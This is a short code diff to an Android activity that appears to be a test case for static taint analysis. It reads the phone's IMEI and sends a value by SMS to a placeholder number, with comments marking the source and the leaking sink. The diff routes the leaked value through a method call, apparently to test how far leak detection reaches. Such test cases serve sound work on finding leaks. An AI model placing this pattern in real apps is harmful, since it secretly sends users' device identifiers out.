@@ -34,7 +34,7 @@ public class MainActivity extends Activity {
 			bc.imei = telephonyManager.getDeviceId(); //source
 			
 			SmsManager sms = SmsManager.getDefault();
-	        sms.sendTextMessage("+49 1234", null, bc.imei, null, null);   //sink, leak
+	        sms.sendTextMessage("+49 1234", null, bc.foo(), null, null);   //sink, leak
 		} catch (InstantiationException e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
